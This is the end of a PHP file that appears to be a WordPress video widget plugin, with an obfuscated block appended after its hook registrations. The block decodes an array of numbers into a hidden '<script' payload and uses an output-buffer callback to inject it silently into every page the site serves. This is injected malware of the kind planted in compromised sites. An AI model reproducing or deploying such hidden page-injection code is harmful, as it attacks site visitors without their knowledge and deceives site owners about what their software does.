add_action('plugins_loaded', 'widget_daikos_youtube_init'); 
add_action('plugins_loaded', 'widget_daikos_videoplayer_init');
?><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>